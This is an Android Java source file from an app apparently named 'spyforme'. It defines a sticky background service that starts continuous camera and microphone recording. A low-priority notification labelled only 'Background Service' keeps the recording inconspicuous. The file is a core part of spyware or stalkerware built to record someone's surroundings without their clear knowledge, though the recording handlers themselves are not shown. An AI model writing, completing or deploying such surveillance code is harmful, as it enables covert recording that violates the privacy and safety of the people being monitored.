package com.spyforme;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

public class BackgroundSpyService extends Service {
    private static final String TAG = "BackgroundSpyService";
    private static final String CHANNEL_ID = "SpyServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    
    private CameraHandler cameraHandler;
    private AudioHandler audioHandler;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        
        // Initialize handlers
        cameraHandler = new CameraHandler(this);
        audioHandler = new AudioHandler(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        
        if (!isRunning) {
            createNotificationChannel();
            startForeground(NOTIFICATION_ID, createNotification());
            
            // Start camera and audio monitoring
            startMonitoring();
            isRunning = true;
        }
        
        return START_STICKY;
    }

    private void startMonitoring() {
        // Initialize camera for background monitoring
        cameraHandler.initialize();
        
        // Initialize audio recording
        audioHandler.startRecording();
        
        Log.d(TAG, "Monitoring started - Camera and Audio active");
    }

    private void stopMonitoring() {
        // Stop camera monitoring
        if (cameraHandler != null) {
            cameraHandler.release();
        }
        
        // Stop audio recording
        if (audioHandler != null) {
            audioHandler.stopRecording();
        }
        
        Log.d(TAG, "Monitoring stopped");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        
        stopMonitoring();
        isRunning = false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Spy Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            serviceChannel.setDescription("Running background monitoring");
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                notificationIntent,
                PendingIntent.FLAG_IMMUTABLE
        );

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Background Service")
                .setContentText("Monitoring in progress")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_LOW);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE);
        }

        return builder.build();
    }
}
